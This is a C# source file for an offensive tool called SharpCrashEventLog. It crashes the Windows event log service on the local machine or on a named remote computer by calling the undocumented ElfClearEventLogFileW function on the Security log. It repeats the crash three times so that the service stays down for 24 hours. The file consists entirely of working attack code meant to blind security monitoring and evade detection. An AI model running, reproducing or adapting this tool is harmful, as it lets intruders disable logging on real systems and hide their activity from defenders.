using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.ServiceProcess;
using System.Threading;

namespace SharpCrashEventLog
{
    class Program
    {
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern IntPtr OpenEventLog(string UNCServerName, string sourceName);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern UInt32 ElfClearEventLogFileW(IntPtr EventLog, IntPtr BackupFileName); //ref UNICODE_STRING BackupFileName
       
        public static bool IsAdministrator()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
                      .IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static bool EventLogRunning(string UNCServerName)
        {
            ServiceController sc = new ServiceController("eventlog");
            if (UNCServerName != "\\\\localhost")
            {
                sc = new ServiceController("eventlog", UNCServerName.Remove(0, 2));
            }

            try
            {
                switch (sc.Status)
                {
                    case ServiceControllerStatus.Running:
                        return true;
                    case ServiceControllerStatus.Stopped:
                        return false;
                    case ServiceControllerStatus.Paused:
                        return false;
                    case ServiceControllerStatus.StopPending:
                        return false;
                    case ServiceControllerStatus.StartPending:
                        return false;
                    default:
                        return false;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Exception caught:\n{0}", e);
                Environment.Exit(0);
                return false;
            }

        }

        public static void CrashEventLog(string UNCServerName)
        {
            IntPtr eventlog;
            try
            {
                if (UNCServerName == "\\\\localhost")
                {
                    eventlog = OpenEventLog(null, "Security");
                }
                else
                {
                    eventlog = OpenEventLog(UNCServerName, "Security");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Exception caught:\n{0}", e);
                Environment.Exit(0);
                return;
            }


            if (eventlog != null)
            {
                Console.WriteLine("    |-> OpenEventLog success!");
                ElfClearEventLogFileW(eventlog, IntPtr.Zero);
                Console.WriteLine("    |-> ElfClearEventLogFileW called!");
                Console.WriteLine("    |-> Event log service crashed!");
                Thread.Sleep(5000);
            }
            else
            {
                Console.WriteLine("    |-> Unable to open a handle to the eventlog, exiting ...");
            }
        }

        static void Main(string[] args)
        {
            if (args == null || args.Length == 0 || args[0] == "-help" || args[0] == "-h")
            {
                Console.WriteLine(@"SharpCrashEventLog by @slyd0g
- Crash the local computer's event log service
    - .\SharpCrashEventLog \\localhost
- Crash a remote computer's event log service
    - .\SharpCrashEventLog \\targetcomputer");
                return;
            }
            string UNCServerName = args[0];
            Console.WriteLine("[+] Targetting {0}.", UNCServerName);

            // Check if running as admin
            if (UNCServerName == "\\\\localhost")
            {
                if (!IsAdministrator())
                {
                    Console.WriteLine("[-] Must be run with administrator privileges, exiting ...");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("[+] Running with administrator privileges.");
                }
            }

            // Check if eventlog service is running
            if(EventLogRunning(UNCServerName))
            {
                Console.WriteLine("[+] Event log service is running.");
            }
            else
            {
                Console.WriteLine("[-] Event log service is not running, exiting ...");
                Environment.Exit(0);
            }

            // Crash event log 3 times to stop it for 24 hours
            CrashEventLog(UNCServerName);
            
            while(!EventLogRunning(UNCServerName))
            {
                Console.WriteLine("[+] Sleeping for 30 seconds ...");
                Thread.Sleep(30000);
            }
            Console.WriteLine("[+] Event log service is running again!");

            CrashEventLog(UNCServerName);

            while (!EventLogRunning(UNCServerName))
            {
                Console.WriteLine("[+] Sleeping for 30 seconds ...");
                Thread.Sleep(30000);
            }
            Console.WriteLine("[+] Event log service is running again!");

            CrashEventLog(UNCServerName);

            if(!EventLogRunning(UNCServerName))
            {
                Console.WriteLine("[+] Event log service should be stopped for 24 hours :)");
            }
        }
    }
}